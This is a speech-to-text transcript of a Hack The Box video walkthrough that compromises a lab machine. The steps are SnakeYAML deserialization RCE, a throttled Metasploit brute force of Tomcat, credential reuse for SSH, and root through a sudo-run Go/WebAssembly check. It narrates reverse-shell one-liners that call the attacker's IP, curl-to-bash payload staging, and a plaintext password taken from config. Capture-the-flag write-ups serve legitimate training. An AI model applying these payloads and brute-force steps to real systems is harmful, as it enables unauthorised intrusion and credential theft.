 what's going on youtube this is ipsec i'm doing of youtube from hack the box at least i hope i pronounced that name correct i have no idea what it means but i do know how the box starts out which is a tomcat web application that is running snake yaml which is just a yaml parser that has a vulnerability in it you can use it to get rce on the server and because it is a tomcat application you enumerate the tomcat configuration to pull a username and password that is used to ssh into the box once on the box you can enumerate the sudo rule and discover that you have access to run a goling program as root so you just do some exploitation around that and get root so with that being said let's just jump in as always i'm gonna start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats but in the nmap directory and call it of uc and then the ip address of 101010227 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server we also have http on port 8080 and its banner tells us it's apache tomcat version 9038 and the hdb title is parse yaml the very first place i'm going to start is just checking out search point for tomcat because i know tomcats had a lot of vulnerabilities and just glancing at this i don't really see anything for nine at least nine something we have nine o right here this is a information disclosure we may want to take a look at this one but again i don't see too much for tomcat version 9038 and i think that's relatively recent if we google like um first have to go to google oh maybe i don't google.com and let's google like apache tomcat 9038 change log and i like adding change logs because this tells us when it's released and we see uh 9048 can we edit the url we can't let's see three eight uh dot three eight and this is 20 2009 so september 15th so probably around the time this box was released is when they did tomcat it's not a extremely old version so not going to dig into tomcat vulnerabilities so let's just check out the page so going to 101010227 and it was on port 8080 so we have to specify that port 8080 and let's get rid of this https and it's just an online yaml parser so i'm going to just put some yaml um thing i think it's like look at what yaml stands for uh emol yet another markup language i think uh yaml yet another i killed my google search there we go yeah mole human readable i'm going to say yet another yeah language with yet another markup language okay yaml ain't i don't exactly know what it is that's a long tangent but i'm just going to do uh test colon true because this is valid yaml you just put like variable colon uh text and we get due to security reasons this feature has been temporarily put on hold we will soon fix the issue so this is a tomcat application so i'm gonna go to slash manager and i'm gonna try logging in with the defaults of like tomcat tomcat or tomcat secret and it doesn't let me in so uh what i'm going to do is some recon in the background while we continue poking at it and i like using metasploit for this one in particular you can use hydra and things like that but i found metasploit to be the most reliable and you can set the brute force speed which has been needed lately in tomcat because it does lock out so i'm going to copy up actually let's do find op setlist and this is just if you google setlistgithub it's just a repository i use i'm going to grab for tomcat and based upon these two uh better default pass list is probably what i want to use so let's copy that in my directory and let's see pwd i'm going to copy this whole thing we can do sudo msf db run we have database already started but it is starting i'm going to do search tomcat and at 19 i see tomcat manager log in so i'm going to use 19 show options and i'm going to set the user pass underscore file so set user pass underscore file and it looks like it already has my clipboard which is annoying so let's just type this again so home ipsec uh htb of uc and then was it tomcat better default pass list there we go i'm going to unset the user file and unset pass file because we don't use those i like using this user pass file because it makes it really easy to brute force combinations of usernames and passwords if we didn't do that and then it would go through like every combination of user and password which would just be a lot so i'm going to edit this tomcat file and it does it based upon space not colon so let's do said to swap out colon for space and there we go um again if i didn't do this it would like take this user route go through every password take the user route again go through every password and i just want to go through specific things like i don't know uh there is some but yeah like root demo is not a password but demo demo may be a tomcat one so let's save that and go back to metasploit and the next thing i want to do is um set brute force speed uh zero to five five is the fastest and i think tomcat has some type of lockout by default so i'm gonna set the brute force speed to 1 because generally that avoids lockout so there we go we have to set our host to be 101010 227 and then run and this is going to take a while because you can see it just did one it's going to wait like 10 to 15 seconds before it goes on to do the next one so while that goes let's take a look at this so if we send text it tells us the feature is temporarily on hold so what if we just put invalid yml is it the same exact error message it looks like it is what if we do some type of special characters so i did quote and then we'll do a bunch of this and we can also do single quote and ooh 500 internal silver error while scanning a quoted scalar uh not exactly sure what went on here but this does show it is doing something and we also have it doing something with snake ammo so let's take a look at this so snakey ammo we have to go google snake yaml and let's see exploit and we have a snake yaml deserialization exploit i'm just getting this for any type of payload we can use and a yaml so here we go we have a payload that looks like it's going to grab a file so let's see i think i copied that is that on my clipboard now let's go back to this nope let's see sometimes copying off websites is hard i don't know why people design them that way but there we go so in snake gamble anytime you do this exclamation exclamation i guess you gain access to this java scripting engine and there is a url class loader and we can specify an ip address i am 10 10 14 2 i believe i'm looking right up here i am 10 10 14 2. so the next thing we want to do is set up a netcat listener so sudo nc lvnp 80 and we click parse it is taking a while which is a good sign because it's probably waiting on us and we do confirm the server reached out to us so we know there's probably some type of vulnerability here if we go back to let's see this blog post it's talking about it more it links to a explanation that is now dead we have this yaml payload off of github and it's telling us we use pretty much the same thing give it a jar file and tells us how to build this so i'm going to git clone this so get clone paste the cml payload and it wants us to modify art sport this and instead of doing this i guess this dig is probably getting some type of statistics on how many people run this exploit but i'm going to exec a reverse shell so let's do bash dash c bash dash i dev tcp 10 10 14 2 9 000 1 0 and 1 like that and see if this works so how do we compile this java c source like that okay let's hope i have a java compiler looks like i do uh where's that jar file let let's do ls source art sport uh we got a java and a class file so we jar create verbose file payload.jar and specify source okay let's go back in dml okay it did a java file which is essentially just a zip and now we have this so i'm going to host a web server so let's do python 3 actually make dirt dub dub dub stay a little bit better organized let's copy this jar file in dub dub dub and then we can do python3 dash m http server on port 80 and then we need to nclvmp 9001 ls dub dub dub emo-payload.jar okay so let's go here we can do yaml payload.jar parse we get that error message again but going back we have it making a request to the jar but no actual reverse shell so let's go back into the yaml payload directory and we can v source exploit awesomescriptengine.java double check this because there are a lot of like typing that we could make a typo looks good and i'm going to change this payload up to be a bit simpler because all these like carrot and and all this stuff the special characters that they may cause issues so what i'm going to do is just do a simple curl so assuming the box says curl this should work 10 10 14 2 we'll call the file shell.sh and pipe it over to bash so that looks good save this and then if this doesn't work we'll try saving the payload to disk and then executing it because this little pipe character could also be considered a bad character so let's do java c then jar dash cvf and we can copy this emo payload to dub dub dub and our metasploit's still going like i said it takes a long time when you set that brute force speed to zero so with v shell rsh and then we'll do bash dash c bash dash i dev tcp 10 10 14 2 9 000 1 0 and 1 like that start up a web server again click back and then parse gets the file it got shell.sh but we don't have a reverse shell so now what i'm thinking is um [Music] maybe bash isn't installed and it's just got dash or something or maybe i just typo this command however um we know carol is on the box so i'm just going to simply call 10 10 14 2 it works and then we're going to stir up another web server i'm just going to do ctrl shift r to resend everything and it got the shell.sh but it didn't get um it works so my assumption of that pipe working and executing this is wrong because we should see a second curl to it works so let's go and edit our payload to drop something to disk and then execute it so going in our exploit v awesome.java we can say curl 10 10 14 2 14 2 00 for our file dev shm shell.sh and then we can do a second one of bash on this file i'm just going to do sh because sh should be sim link to bash if not it's probably some link to dash or something but it should be fine and let's do java c jar dash c whatever source and let's copy it into the dub dub dub directory directly so i don't have to oh i can't just do it here and then mainly copy that payload so yaml payload two dub dub dub and in here let's do that bash one liner again if i was a smart man i would have saved the output to save me from typing but it's muscle memory at this point bash dash i there we go so let's stamp this web server ctrl shift r to refresh we get shell.s h but we don't get that reverse shell so let's v actually yeah let's just do it here curl 10 10 14 2 it works stand this up refresh and it's not doing a it works thing so i'm not sure exactly what is going on with this payload so at this point let's see sh so it should have saved and dev shm shell.sh we definitely get the file let's try a different payload so i'm going to search for payload all the things reverse shell google let's just do reverse shell pen test monkey is what i actually wanted and we'll try a reverse shell with netcat like this one so let's try this paste this in edit our ip so ten ten fourteen two nine thousand one java c or yeah i gotta go up one more directory jar cp ammo payload to a www directory and if i see it doing a curl against shell.sh i know i probably should change the file name or something because something's getting cached we just get a request to yammerpayload.jar and nothing on port 9001 so let's go back to our payload so i'm going to find my vi i would just just go what is it um yaml payloads source okay source art split resource exploit awesome script engine.java so we have our payload right here and we're doing this i'm just going to try this curl again so i'm going to switch it up we know we can make a curl request so curl 10 10 14 two slash shell dot sh dash oh except dev shm i'm just gonna use slash temp so shell.sh and then we'll do a second request to execute it there's a few things because i think i just copied and pasted like this runtime and what could have happened is it doesn't wait for the command to finish and just execute it too quickly so i'm going to do this in two different payloads and try that so we got this curl shoulders h and then let's v show.sh i mean that should be a fine one still so we have to java c jar dash whatever copy it to a dub dub dub and this should just download the file and then before we actually run it i'm going to prep a second one and we're just going to execute it so we'll just exec bash temp sh i could try sh but i'm going to use bash this time because i think bash is on bash is almost always on the system at least ubuntu so let's see java c jar and i'm just going to prep this up not going to hit enter so we can send this and this should get curl.sh or shell.sh and now i copy the other one that should execute it so we run it again we sent this we got a it works so we know doing it this way does work if we separate it out downside is no shell so if i look at shell.sh we did this curl and then it did not do a shell so let's try that netcat shell we should have it right here is there a different clipboard it was there we go and then 10 10 14 2. nine thousand one so unfortunately we have to go back and um let's see cpemo payload this will be exec.jar and then one last time let's do a download so instead of bash we'll do curl 10 10 14 2 shout out sh l temp show java c [Music] okay should be fine let's copy this emo payload to dub dub dub and then we can prep the exact jar do dub dub dub yaml payload start a web server send we got shout sh copy the execute one send it and hey we finally got a shell uh the very first thing i do is lsla on bin and grep for bash and there's our bash is linked to bash grep for sh which sh user band so they did something with bash and broke it i'm not sure exactly what but yeah so that's annoying python3 dash c import pty pty dot spawn then bat no then sh [Laughter] uh z sty raw minus echo fg enter enter ls ah i don't have a full tty oh well um there's probably something i could do but i'm dancing around that bash carefully is there like user ben bash huh there is user ben bash watch me get dropped in restricted bash nope awesome normal tty did not think that would work export term is equal to x term so i can clear the screen and let's see we are the tomcat user the first thing i always like checking is just sudoers and we do sudo l and it asks us for a password i'm gonna try the password password and a password of tomcat to see if anything works and it doesn't look like we get anything and before we go digging more into pseudo let's just find out if it's even interesting to us so i'm gonna do lsla on etsy sudoers and we can see its timestamp is december 28th and the size is 8.45 i know the default size of sudoers is around like 750 for ubuntu if we just google like um default pseudor's file we can probably find that out and again i killed off my google and the url bar and let's see is there here we go so if i go to raw let's just w get this real quick wget and then lsla two-doors it's 7.55 so we know the size doesn't match up so it probably has an extra line or two based upon that i'm guessing an extra line and we can see the date is december 28th of 2020. now we don't know when the server was built yet generally how i find that out is if i have access to etsy ssh i look at the date these keys were generated so chances are the ssr the server is built october 11 2020. and the reason these keys don't change too often is because if they do change you get that annoying like someone's trying to man in the middle your ssh connection so these keys generally don't rotate and um since the pseudorise file was edited december 28th and the server was built october 11th again that indicates that something has changed in the suitors file so what i'm going to do is take a look at the tomcat password and we could go back to our metasploit where we brute forced and we never gained access uh if you don't if you weren't like skipping around uh we're trying to get into this slash manager now that we have shell on the box as tomcat we can just read the configuration file and get that password and that's normally an up then tomcat tomcat it's wherever the tomcat is installed generally on linux it's an opt it may also be like on user share things like that but just look for where tomcat's installed if you don't know you can probably do psef let's see let's fix our tty real quick s-t-t-y dash a rows 35 columns 136 sdy rows 34 136 34 calls 136. now if i do a ps ef that works tomcat let's see do we see opt anywhere uh right here let's see i wonder if i do psef less dash capital s tomcat and with this we can go left and see the whole command line parameter but we can see it is indeed installed in op tomcat so if i didn't know where tomcat was this is where i pulled that information so we can go up tomcat uh it also looks like it is my home uh if i do env look at home it is also here so two different ways you can find potentially where tomcat's installed look at ps or look at your home directory so i'm going to go into conf and then the credentials is probably under tomcat users.xml and these use html comments so we can see this is all commented out because it starts with that exclamation into dashes and ends so we just want to find where it's not commented and this is a comment end and this is uncommented this is comment begin so the password here is why there is a limit so we can now test this with admin why there is a limit and we get into tomcat now this doesn't really buy us anything other than persistence at this thing because we got code execution on yaml and it runs as tomcat so even if we upload a malicious tomcat application we'd still be getting the same user um i guess the benefit of this would be is if we're doing an engagement and they didn't like a repeat engagement and they patched the ammo but didn't change the credentials to tomcat this is more of a persistence as we can now just deploy another application so let's go check the suitors with sudo l paste this password and it is not the password for tomcat so what i'm gonna do is cat etsy passwd and see if this is the password for anyone else on the box uh i'm gonna do sh uh let's do grep sh and it's gonna be been bash so that could be a weird restricted bash thing um let's ssh admin at 10 10 10 227 except this put in the password and it looks like this does work and i'm not in our bash oh let's see i did ben and gret for bash oh herb bash was sim linked to bash not the other way around so there is no urbash on the system okay that's fine i'm going to try sudo l and we can see [Music] this user does have a pseudoers rule so we can run user bin go run opt wasm functions index.go so let's try this let's just copy this whole line and then do sudo paste and it looks like it errors so index out of range with a length of zero so let's take a look at what index.go is because even though this is golang girling has two options you can either execute and build full out binaries either elf pe whatever you want pe being windows like exe or you can just run scripts so it's just running the script and this behaves much like python where you just give it a go file and it will compile and run it so it's looking like it is doing something with wasm which is a web assembly thing and it's pulling from this github repel but we got to find this main dot wasm file so looking at this it's doing main.wasm loading the instance and then calling info it looks like and if it returns one it's going to say not ready to deploy else it's going to say ready to deploy and execute deploy.sh so the error is probably because we don't have main.wasm in our directory so i'm going to do a fine slash and then pipe it or not pipe but send error messages to devnull and grepformane.wasm to see where it is and it looks like there's a directory opt wasm functions and if we run it in this directory let's go back to that pseudor's rule it says not ready to deploy so let's go into backup and try running this and not ready deploy again so we have to somehow get this file to um return zero instead of one so wasm does have a decrypter so i'm gonna google wasm decrypt again i gotta like fix my goo uh firefox so it goes back to googling in that url bar let's see is it in this no let's see webassembly binary kit this looks like it i'm going to download ubuntu.gz and let's see if this does it so let's go here mv downloads uh not web.config what was its name wabt xjvf uh x is it z okay xz vf and let's go into this go to bin and we have let's see we have a wasm so maybe wasm to t i think yeah wasn't to wat i think this is text and then we can do watt to wasm to convert back or maybe just wasm decompile we got a lot of binaries in here so we're going to do let's just copy it over nclvmp 9001 to main.wasm and then see that is tomcat let's just cat main.wasm to nc1010142 port 9001 and we're sending this over to our box and we have main.wasm there so let's go wasm to wat main.wasm and we have a file here so let's do main.wat and this doesn't really look too helpful see let's look at what index was so a pseudo rule we want to grab this file exactly what is it doing out of here it reads the wasm and then it calls info oh it's not equals to one for some reason i was thinking was equals but it's not equals to one so we just say const is equal to one so now we're going to hit this i think so it was zero and zero doesn't equal one so it goes here yep i'm right it's just i don't know why it's weird logic to me but for some reason it's just written weird but yeah so we do one we go down to this else and it executes deploy.sh okay so that makes sense so we change this to one and now we did wasm to what so we can do what to wasm and then main dot want and let's see i'm going to delete main.wasm because it didn't give me any output so i don't know if it just erased it or not so do this lsla so it created that main.wasm again so i think that one is a good one so how can we copy this back i guess i can just scp it scp main dot wasm to admin at 10 10 10 2 2 7 i believe you have to do colon and then why there is a limit was the password i believe there we go so if i go in home we have main.wasm so i'm going to make directory.yep i'm going to move main.wasm in here and we probably have to move almost everything else so let's see ah maybe just deploy.sh and we can actually copy slash temp shout out sh do we still have that ls slash temp uh let's see that's under is it under this let's see go back to our netcat cd netcat's gone um we can just go into a www directory because we know whatever is in shell.s8 works for a reverse shell see i still have that listening so i can just grab shoulder sh so w get 10 10 14 2 slash shell dot sh move shoulder sh to deploy.sh nc lvmp 9001 so let's run this sudo again it says ready deploy and it deploys and we are root so that is awesome and that is pretty much the box i hope you guys enjoyed it um i do want to go back and we look at this um metasploit thing we never logged in so let's edit the file we used so let's do show options and i'm going to use this default pass list and we're just going to put the correct password and set brute force speed to its fastest and see if it works i don't think it will so i just want to kind of demo this piece so let's go of uc [Music] v tomcat put it here admin why there is a limit so if i run this it's going to go through a bunch and tell me everything is incorrect so i'm going to speed up the video so yeah and we see never logs in um if i put this now at the top of the list i don't think it's gonna work because i'm probably locked out so let's just run this again one two so it's saying yes incorrect so i'm going to revert the box and we're going to run this with a low brute force and show it actually works so brute force b to set back to one gonna revert the box and we will rerun it the box has now been reverted i'm going to run this again and probably just leave my computer 804 a little bit i may not bother speeding it up because this does take a long time to run if you've been paying attention to my clock and the top right the previous one took like two minutes to run i'm guessing this is going to take like 15 to 20 minutes it's a lot slower but again locking yourself out of accounts is always bad um because you see you have the correct password but it just says incorrect so hopefully at the end of this one we'll see it does find the valid password after like 80 different attempts i say 80 because i see 80 lines down there so yep gonna let this run um we'll see what happens so after around 20 minutes we finally hit the password uh it is definitely very slow when we turn this brute force speed down to one however when it was at five um metasploit just never got it because tomcat timed us out and that's one of the reasons why i like the metasploit scanner i know a lot of people probably like oh my god why using metasploit why not use like hydra and crack things like that because metasploit made it super easy to set the speed additionally if we wanted to um it supports proxies by default so we don't have to do any like proxy chain hack to try to get the tool working it just has a lot more options to do these types of things additionally it sets um verbose to true so we see all the attempts in real time as it goes if we set to false then this log and fail thing would uh go away but that's essentially why i like using metasploit just because i find it generally works better than those like one-off tools so hope you guys enjoyed the video take care and i will see you all next week